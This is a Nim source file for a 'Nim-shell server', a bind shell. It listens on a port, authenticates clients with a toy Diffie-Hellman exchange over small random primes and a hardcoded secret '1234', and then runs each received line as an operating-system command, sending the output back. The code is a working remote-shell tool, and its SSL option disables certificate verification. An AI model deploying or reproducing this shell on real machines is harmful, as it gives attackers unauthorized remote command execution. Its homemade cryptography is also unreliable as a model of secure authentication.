import net
import nativesockets
import osproc
import strutils
import os
import json
import options
import random
import math
import bitops
import algorithm
import argparse
import hashids
import std/sha1

type
    DH = object
        pub: int
        msg: string

proc power(a, b, p: int): int {.inline.} =
    var 
        x: int = a
        y: int = b
        res: int = 1

    x = x mod p

    while y > 0:
        if bitand(y , 1) == 1:
            res = (res * x) mod p

        y = floorDiv(y, 2)
        x = (x * x) mod p
    return res

proc check(n: int, s: seq): bool {.inline.} =
    var x = newSeq[int]()
    for i in s:
        if x.contains(i):
            return false
        else:
            x.add i
    x.setLen(0)    
    return true

proc findPrimitiveRoot(n: int): int {.inline.} =
    var 
        x = newSeq[int]()
        y = newSeq[int]()
        tot = 0

    for i in countup(100, 200):
        for j in countup(100, 200):
            var t = power(i, j, n)
            x.add t
        if check(n, x):
            tot = tot + 1
            y.add i
        x.setLen(0)

    for i, v in reversed(y):
        if bitand(v , 1) == 1:
            return v

proc getRandomPrime(): int {.inline.} =

    randomize()

    var prime:int = 5023
    const randRange: int = 2000
    let 
        randHigh: int = rand(3000..10000)
        randLow: int = randHigh - randRange

    for n in countdown(randHigh, randLow):
        var isPrime = true

        for num in countdown(floorDiv(n, 2), 2):
            if n mod num == 0:
                isPrime = false
        
        if isPrime:
            prime = n
            break

    return prime

proc calcPublicKey(g, x, p: int): int =
    return power(g, x, p)

proc calcSecretKey(s, k, p: int): int =
    return power(s, k, p)

proc toString(str: seq[char]): string =
    result = newStringOfCap(len(str))
    for ch in str:
        add(result, ch)

proc main(port: int, ssl, verbose: bool) = 
    const SECRET: string = "1234"

    var 
        run = true
        server: Socket = newSocket()
        clients: seq[Socket] = @[]
        secrets: seq[string] = @[]

    server.setSockOpt(OptReuseAddr, true)
    server.getFd().setBlocking(false)
    server.bindAddr(Port(port))
    server.listen()

    if ssl:
        var ctx = newContext(certFile = "mycert.pem", verifyMode = CVerifyNone)
        wrapSocket(ctx, server)

    echo "Listening on ", port

    while run:
        try:
            var client: Socket = new(Socket)
            server.accept(client)
            
            echo "Server: client connected"

            let 
                primeNumber: int = getRandomPrime()
                primitiveRoot: int = findPrimitiveRoot(primeNumber)
                privateKey: int = getRandomPrime()
                pubKey: int = calcPublicKey(primitiveRoot, privateKey, primeNumber)
                
            var jsonObject = %* {"base": primitiveRoot, "prime": primeNumber, "pub": pubKey}

            client.send($jsonObject & "\r\L")
            let recvJson = client.recvLine(timeout = 10)
            
            try:
                let 
                    jsonData = parseJson(recvJson)
                    dh: DH = to(jsonData, DH)
                    clientPubKey: int = dh.pub
                    clientMsg: string = dh.msg
                    secret: int = calcSecretKey(clientPubKey, privateKey, primeNumber)
                    hid: Hashids = createHashids(SECRET & $secret)
                    # dec: seq[int] = hid.decode(clientMsg)
                    dec = secureHash(hid.encode("Success".mapIt(it.ord)))
                
                #if toString(dec.mapIt(it.chr)) == "Success":
                if $dec == clientMsg:
                    echo "Server: client authenticated"
                    clients.add(client)
                    let idMsg = secureHash(hid.encode("Connected".mapIt(it.ord)))
                    jsonObject = %* {"msg": $idMsg}
                    client.send($jsonObject & "\r\L")
                else:
                    echo "Server: client authenticaation failed"
                    client.close()
                    
            except JsonParsingError:
                echo "Server: client json parse error"
                client.close()

        except OSError:
            discard

        var clientsToRemove: seq[int] = @[]

        for index, client in clients:

            try:
                let command: string = client.recvLine(timeout = 5)

                if command == "":
                    clientsToRemove.add(index)
                elif command == "shutdown":
                    run = false
                elif command == "cd" or command == "cd ":
                    client.send("Must specify path\r\L\r\L")
                elif command.startsWith("cd"):
                    let dir = command.split()[1]

                    if len(dir) > 0:
                        try: 
                            os.setCurrentDir(dir)
                            var result = os.getCurrentDir()
                            client.send(result & "\r\L\r\L")
                        except OSError:
                            client.send("Directory doesn't exist!\r\L\r\L")
                    else:
                        client.send("Must specify path\r\L\r\L")
                else:
                    try: 
                        var result = execProcess(command)
                        client.send(result & "\r\L")
                    except OSError:
                        discard

            except TimeoutError:
                discard

        for index in clientsToRemove:
            clients.del(index)
            echo "Server: Client disconnected"

    server.close()
    system.quit(0)

var p = newParser:
    help("Nim-shell server")
    flag("-s", "--ssl", help="Enable SSL")
    flag("-v", "--verbose", help="Enable verbost output for debugging")
    option("-p", "--port", help="Target port", required=false)
    
try: 
    var x = p.parse(commandLineParams())
    
    main(parseInt(x.port), x.ssl, x.verbose)
except ShortCircuit as e:
    if e.flag == "argparse_help":
        echo p.help
        quit(1)
except UsageError:
    stderr.writeLine getCurrentExceptionMsg()
    quit(1)
